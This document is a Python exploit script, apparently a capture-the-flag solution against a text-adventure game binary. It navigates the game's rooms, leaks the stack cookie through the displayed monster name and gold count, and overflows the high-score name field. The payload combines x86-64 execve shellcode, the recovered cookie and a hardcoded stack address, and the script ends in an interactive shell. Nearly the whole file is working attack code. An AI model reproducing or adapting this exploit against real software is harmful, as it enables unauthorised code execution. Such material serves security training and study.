import interact
import struct

buffaddr = '\xd0\xec\xff\xff\xff\x7f\x00\x00'
shellcode = '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

p = interact.Process()

# Move player to room with stack cookie
data = p.readuntil('Press enter to continue...')
p.sendline('')

data = p.readuntil('quit)\n')
p.sendline('down')

data = p.readuntil('fight)|\n+------------------------------+')
p.sendline('run')

data = p.readuntil('quit)\n')
p.sendline('left')

data = p.readuntil('fight)|\n+------------------------------+')
p.sendline('run')

data = p.readuntil('quit)\n')
p.sendline('down')

# Defeat monster
data = p.readuntil('You encounter a ')
data = p.readuntil('|')
cookie = int(data.split()[0], 16)
data = p.readuntil('-+')
p.sendline('fight')
data = p.readuntil('|\n+-------------------------------+')
p.sendline(hex(~cookie))
data = p.readuntil('Press enter to continue...')
p.sendline('')

# Capture upper 32 bits of cookie, displayed as treasure collected
data = p.readuntil('Gold Collected: ')
data = p.readuntil('\n')
data = filter(lambda x: x.isdigit(), data)
cookie = (cookie << 32) + int(data[:9])

# Get new highscore
data = p.readuntil('quit)\n')
p.sendline('quit')

# Inject payload in name field
data = p.readuntil('Please enter your name:')
payload = shellcode + 'a'*(40 - len(shellcode)) + struct.pack('Q', cookie) + 'a'*8 + buffaddr
p.sendline(payload)

data = p.readuntil('Press enter to continue...')
p.sendline('')

p.interactive()